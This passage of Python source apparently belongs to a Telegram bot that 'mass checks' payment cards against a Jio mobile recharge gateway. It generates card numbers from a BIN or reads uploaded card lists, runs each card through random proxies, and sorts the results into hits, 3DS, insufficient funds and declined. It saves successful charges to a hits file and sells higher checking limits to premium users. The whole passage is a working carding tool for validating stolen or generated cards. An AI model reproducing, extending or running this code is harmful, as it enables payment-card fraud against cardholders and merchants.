        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)

    limit = ADMIN_LIMIT if is_admin(uid) else (PREMIUM_LIMIT if is_premium(uid) else FREE_LIMIT)
    if limit == 0:
        bot.reply_to(message, "⚠️ <b>Free users cannot use mass check.</b>", parse_mode="HTML"); return
    if ACTIVE_USERS_MPP.get(uid):
        bot.reply_to(message, "⚠️ <b>Mass check already running.</b>", parse_mode="HTML"); return

    args = message.text.split()
    cards = []
    phone = amount = None

    if len(args) >= 5:
        phone, amount, bin_str = args[1], args[2], args[3]
        try: count = int(args[4])
        except: count = 5
        count = min(count, limit)
        cards = generate_cards(bin_str, "12", "2029", count)
    elif len(args) >= 3 and message.reply_to_message and message.reply_to_message.document:
        phone, amount = args[1], args[2]
        fi = bot.get_file(message.reply_to_message.document.file_id)
        raw = bot.download_file(fi.file_path)
        for l in raw.decode('utf-8', errors='ignore').splitlines():
            c = parse_card_line(l)
            if c: cards.append(c)
        if not cards:
            bot.reply_to(message, "❌ <b>No valid cards in file.</b>", parse_mode="HTML"); return
        cards = cards[:limit]
    else:
        bot.reply_to(message,
            "📝 <b>Usage:</b>\n"
            "<code>/mjio &lt;phone&gt; &lt;amount&gt; &lt;bin&gt; &lt;count&gt;</code>\n"
            "OR reply .txt with: <code>/mjio &lt;phone&gt; &lt;amount&gt;</code>",
            parse_mode="HTML"); return

    job_id = f"{int(time.time())}{random.randint(100,999)}"
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[uid] = True
    total = len(cards)

    results = {"hits":0,"hits_list":[],"declined":0,"declined_list":[],
               "3ds":0,"3ds_list":[],"error":0,"error_list":[],"checked":0,
               "insufficient":0,"insufficient_list":[]}
    start_time = time.time()
    last_update = [0]
    ulock = threading.Lock()
    rk = " [ADMIN]" if is_admin(uid) else (" [PREMIUM]" if is_premium(uid) else " [FREE]")

    def cap(done=False):
        el = int(time.time() - start_time); m, s = divmod(el, 60)
        st = "✅ Completed\n" if done else ""
        return (f"📊 <b>Mass Jio Recharge</b>\n━━━━━━━━━━━━━━━━━━━━\n{st}"
                f"┣ 📦 Progress ➜ {results['checked']}/{total}\n"
                f"┣ ✅ Hits ➜ {results['hits']}\n"
                f"┣ 🔥 3DS ➜ {results['3ds']}\n"
                f"┣ 💸 Insufficient ➜ {results['insufficient']}\n"
                f"┣ ❌ Declined ➜ {results['declined']}\n"
                f"┣ ⚠️ Errors ➜ {results['error']}\n"
                f"┗ ⏱️ Time ➜ {m:02d}:{s:02d}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User: {message.from_user.first_name}{rk}")

    def mkup(done=False):
        m = telebot.types.InlineKeyboardMarkup()
        if not done:
            m.add(telebot.types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{job_id}"))
        return m

    prog = bot.reply_to(message, cap(), parse_mode="HTML", reply_markup=mkup())

    def worker(card):
        if not ACTIVE_JOBS.get(job_id): return
        proxy = get_random_proxy()
        try:
            status, response, _ = run_check(phone, amount, card, proxy_str=proxy)
        except Exception as e:
            status, response = "error", f"Failed: {str(e)[:120]}"
        entry = f"{card_label(card)} - {response}"

        if status == "success":
            results["hits"] += 1; results["hits_list"].append(entry)
            with open(HITS_FILE, 'a', encoding="utf-8") as f:
                f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")
        elif status == "3ds":
            results["3ds"] += 1; results["3ds_list"].append(entry)
        elif status == "insufficient":
            results["insufficient"] += 1; results["insufficient_list"].append(entry)
        elif status in ("expired","invalid_cvv","invalid_card","issuer_decline","blocked",
                        "not_permitted","limit_exceeded","velocity","processor_error","failed"):
            results["declined"] += 1; results["declined_list"].append(entry)
        else:
            results["error"] += 1; results["error_list"].append(entry)
        results["checked"] += 1

        if status in ("success", "3ds", "insufficient"):
            safe = str(response).replace("<","").replace(">","").replace("&","")
            safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")
            single = (
                f"{status_head(status)}\n━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Phone</b> ━ <code>{phone}</code>\n"
                f"💰 <b>Amount</b> ━ ₹{amount}\n"
                f"💳 <b>Card</b> ━ <code>{card_label(card)}</code>\n"
                f"📩 <b>Response</b> ━ {safe}\n"
                f"🌐 <b>Gateway</b> ━ Jio Recharge\n━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {safe_name}{rk}"
            )
            try:
                bot.send_message(message.chat.id, single, parse_mode="HTML")
                time.sleep(random.uniform(1.0, 2.0))
            except Exception as e:
                err = str(e)
                if '429' in err:
                    m = re.search(r'retry after (\d+)', err)
                    time.sleep(int(m.group(1))+2 if m else 30)
                else: time.sleep(3)

        with ulock:
            do = results["checked"] >= last_update[0] + 1 or results["checked"] == total
            if do: last_update[0] = results["checked"]
        if do:
            try: bot.edit_message_text(cap(), message.chat.id, prog.message_id,
                                       parse_mode="HTML", reply_markup=mkup())
            except: pass

    try:
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            for c in cards:
                if not ACTIVE_JOBS.get(job_id): break
                ex.submit(worker, c)
        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[uid] = False
        try: bot.edit_message_text(cap(done=True), message.chat.id, prog.message_id,
                                   parse_mode="HTML", reply_markup=mkup(done=True))
        except: pass

        lines = []
        for sec, lbl in [("hits_list","HITS"),("3ds_list","3DS"),
                         ("insufficient_list","INSUFFICIENT FUNDS"),
                         ("declined_list","DECLINED"),("error_list","ERRORS")]:
            if results.get(sec):
                lines.append(f"{lbl}:"); lines.extend(results[sec]); lines.append("")
        if lines:
            content = "\n".join(lines)
            fcap = (f"📊 <b>Results</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                    f"┣ ✅ Hits ➜ {results['hits']}\n"
                    f"┣ 🔥 3DS ➜ {results['3ds']}\n"
                    f"┣ 💸 Insufficient ➜ {results['insufficient']}\n"
                    f"┣ ❌ Declined ➜ {results['declined']}\n"
                    f"┣ ⚠️ Errors ➜ {results['error']}\n"
                    f"┗ 📦 Total ➜ {results['checked']}")
            path = "JioResults.txt"
            with open(path, "w", encoding="utf-8") as f: f.write(content)
            with open(path, "rb") as f:
                bot.send_document(message.chat.id, f, caption=fcap, parse_mode="HTML")
            try: os.remove(path)
            except: pass
    except Exception as e:
        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[uid] = False

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def cb_stop(call):
    try: bot.answer_callback_query(call.id, "Stopping...")
    except: pass
    jid = call.data[5:]
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False

@bot.message_handler(commands=['info'])
def user_info(message):
    uid = str(message.from_user.id)
    role, limit, exp = "[FREE]", FREE_LIMIT, "NEVER"
    if is_admin(int(uid)):
        role, limit, exp = "[ADMIN]", ADMIN_LIMIT, "Lifetime"
    elif is_premium(int(uid)):
        role, limit = "[PREMIUM]", PREMIUM_LIMIT
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if line.startswith(uid + "|"):
                    e = float(line.strip().split('|')[1])
                    exp = "Lifetime" if e == 0 else datetime.datetime.fromtimestamp(e).strftime('%Y-%m-%d %H:%M:%S')
                    break
    bot.reply_to(message,
        f"👤 <b>Account Info</b>\n━━━━━━━━━━━━━\n"
        f"🆔 <b>ID:</b> {uid}\n"
        f"👑 <b>Rank:</b> {role}\n"
        f"📅 <b>Expires:</b> {exp}\n"
        f"🔢 <b>Mass Limit:</b> {limit}",
        parse_mode="HTML")

# =====================================================================
# ADMIN
# =====================================================================
@bot.message_handler(commands=['addpremium', 'premium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        p = message.text.split()
        if len(p) < 3:
            bot.reply_to(message, "📝 <code>/addpremium &lt;id&gt; &lt;duration&gt;</code>", parse_mode="HTML"); return
        tid, dur = p[1], p[2]
        exp = parse_duration(dur)
        if exp is None:
            bot.reply_to(message, f"❌ <b>Invalid duration:</b> {dur}", parse_mode="HTML"); return
        if add_premium(tid, exp):
            dur_str = "Lifetime" if exp == 0 else dur
            bot.reply_to(message, f"✅ <b>Premium added</b> ➜ <code>{tid}</code> ({dur_str})", parse_mode="HTML")
            try: bot.send_message(int(tid), f"👑 <b>Premium added!</b>\nDuration: {dur_str}", parse_mode="HTML")
            except: pass
        else:
            bot.reply_to(message, "❌ <b>Failed.</b>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> {str(e)[:100]}", parse_mode="HTML")

@bot.message_handler(commands=['rmpremium', 'unpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        tid = message.text.split()[1]
        if remove_premium(tid):
            bot.reply_to(message, f"✅ <b>Premium removed</b> ➜ <code>{tid}</code>", parse_mode="HTML")
        else:
            bot.reply_to(message, "❌ <b>Failed.</b>", parse_mode="HTML")
    except: bot.reply_to(message, "📝 <code>/rmpremium &lt;id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        p = message.text.split()
        tid = p[1]
        dur = p[2] if len(p) > 2 else 'lifetime'
        exp = parse_duration(dur)
        if exp is None:
            bot.reply_to(message, "❌ <b>Invalid duration.</b>", parse_mode="HTML"); return
        with open(BANNED_FILE, 'a') as f: f.write(f"{tid}|{exp}\n")
        bot.reply_to(message, f"✅ <b>Banned</b> ➜ <code>{tid}</code> ({dur})", parse_mode="HTML")
    except: bot.reply_to(message, "📝 <code>/ban &lt;id&gt; &lt;duration&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        tid = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        bot.reply_to(message, f"✅ <b>Unbanned</b> ➜ <code>{tid}</code>", parse_mode="HTML")
    except: bot.reply_to(message, "📝 <code>/unban &lt;id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    with open(USERS_FILE, 'r') as f: uc = len(f.read().splitlines())
    with open(PREMIUM_FILE, 'r') as f: pc = len(f.read().splitlines())
    with open(BANNED_FILE, 'r') as f: bc = len(f.read().splitlines())
    with open(HITS_FILE, 'r') as f: hc = len(f.read().splitlines())
    bot.reply_to(message,
        f"📊 <b>Bot Stats</b>\n━━━━━━━━━━━━━\n"
        f"✅ <b>Total Hits:</b> {hc}\n"
        f"👤 <b>Users:</b> {uc}\n"
        f"👑 <b>Premium:</b> {pc}\n"
        f"❌ <b>Banned:</b> {bc}",
        parse_mode="HTML")

# =====================================================================
# MAIN
# =====================================================================
if __name__ == "__main__":
    print("JIO BOT IS RUNNING...\n")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
